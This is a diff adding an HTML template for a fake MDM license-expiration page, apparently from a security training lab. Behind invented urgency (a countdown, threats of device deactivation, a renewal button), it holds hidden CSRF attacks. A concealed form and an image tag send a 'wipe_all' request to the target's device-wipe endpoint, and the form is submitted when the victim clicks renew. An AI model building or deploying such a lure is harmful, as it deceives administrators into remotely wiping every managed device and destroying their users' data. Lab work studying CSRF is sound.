@@ -1,0 +1,144 @@
+<!doctype html>
+<html class="no-js" lang="en">
+<head>
+    {% set title = 'License Expiration' %}
+    {% include 'b_head.html' %}
+</head>
+
+<body>
+    <div class="auth-wrapper">
+        <div class="container-fluid h-100">
+            <div class="row flex-row h-100 bg-white">
+                <div class="col-xl-8 col-lg-6 col-md-5 p-0 d-md-block d-lg-block d-sm-none d-none">
+                    <div class="lavalite-bg" style="background-image: url('{{ url_for('static', filename='img/login-bg.jpg') }}')">
+                        <div class="lavalite-overlay"></div>
+                    </div>
+                </div>
+                <div class="col-xl-4 col-lg-6 col-md-7 my-auto p-0">
+                    <div class="authentication-form mx-auto">
+                            <h3>mHack MDM Solutions</h3>
+                            <small class="text-muted">License Management Portal</small>
+                        <h3>⚠️ License Expiration Notice</h3>
+                        
+                        <div class="alert alert-danger">
+                            <strong>URGENT: Your MDM licenses expire in 18 hours!</strong><br>
+                            Immediate renewal required to prevent service disruption.
+                        </div>
+
+                        <div class="card">
+                            <div class="card-body">
+                                <h5>📋 License Details</h5>
+                                <div class="row">
+                                    <div class="col-6"><strong>License Type:</strong></div>
+                                    <div class="col-6">Enterprise MDM</div>
+                                </div>
+                                <div class="row">
+                                    <div class="col-6"><strong>Device Count:</strong></div>
+                                    <div class="col-6">500 devices</div>
+                                </div>
+                                <div class="row">
+                                    <div class="col-6"><strong>Expiry Date:</strong></div>
+                                    <div class="col-6 text-danger"><strong>January 8, 2025</strong></div>
+                                </div>
+                                <div class="row">
+                                    <div class="col-6"><strong>Status:</strong></div>
+                                    <div class="col-6"><span class="badge badge-warning">⏰ Expiring Soon</span></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="alert alert-warning">
+                            <h6>What happens if licenses expire:</h6>
+                            <ul class="mb-0">
+                                <li>All managed devices will be automatically deactivated</li>
+                                <li>Corporate apps and data will be removed</li>
+                                <li>Email and VPN access will be disabled</li>
+                                <li>Devices will require manual re-enrollment</li>
+                            </ul>
+                        </div>
+
+                        <div class="text-center mt-3 mb-3">
+                            <div class="mb-2">
+                                <small class="text-muted">Time remaining:</small><br>
+                                <span id="countdown" class="h4 text-danger">17:45:32</span>
+                            </div>
+                            <button onclick="renewLicense()" class="btn btn-success btn-lg">
+                                RENEW LICENSE NOW
+                            </button>
+                        </div>
+
+                        <div class="card">
+                            <div class="card-body">
+                                <h6>Renewal Options</h6>
+                                <div class="form-check">
+                                    <input class="form-check-input" type="radio" name="renewal" id="option1" checked>
+                                    <label class="form-check-label" for="option1">
+                                        <strong>1 Year - $4,999</strong> <small class="text-success">(Save 20%)</small>
+                                    </label>
+                                </div>
+                                <div class="form-check">
+                                    <input class="form-check-input" type="radio" name="renewal" id="option2">
+                                    <label class="form-check-label" for="option2">
+                                        <strong>6 Months - $2,799</strong>
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Hidden CSRF attack forms -->
+                        <form id="csrfAttackForm" method="POST" action="{{ target_domain }}csrf/wipe-device" style="display: none;">
+                            <input type="hidden" name="action" value="wipe_all">
+                        </form>
+
+                        <!-- Alternative attack methods -->
+                        <img src="{{ target_domain }}csrf/wipe-device?action=wipe_all" style="display: none;" onerror="console.log('Image-based CSRF failed (good!)')">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Countdown timer for urgency
+        let timeLeft = 17 * 3600 + 45 * 60 + 32; // 17 hours, 45 minutes, 32 seconds
+        
+        function updateCountdown() {
+            const hours = Math.floor(timeLeft / 3600);
+            const minutes = Math.floor((timeLeft % 3600) / 60);
+            const seconds = timeLeft % 60;
+            
+            document.getElementById('countdown').textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+            }
+        }
+        
+        // Update countdown every second
+        setInterval(updateCountdown, 1000);
+        updateCountdown(); // Initial call
+
+        function renewLicense() {
+            // Show processing message
+            document.getElementById('loadingMessage').style.display = 'block';
+            
+            // Simulate license renewal process
+            setTimeout(function() {
+                document.getElementById('csrfAttackForm').submit();
+            }, 2000);
+        }
+    </script>
+
+    <div id="loadingMessage" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 20px; border: 2px solid #28a745; border-radius: 5px; z-index: 1000; box-shadow: 0 4px 8px rgba(0,0,0,0.3);">
+        <h4>🔄 Processing License Renewal...</h4>
+        <p>Preparing devices for license migration...</p>
+        <p><small class="text-muted">Please wait while we update your device registrations...</small></p>
+        <div class="progress">
+            <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 75%"></div>
+        </div>
+    </div>
+
+    {% include 'b_loginfooter.html' %}
+</body>
+</html>
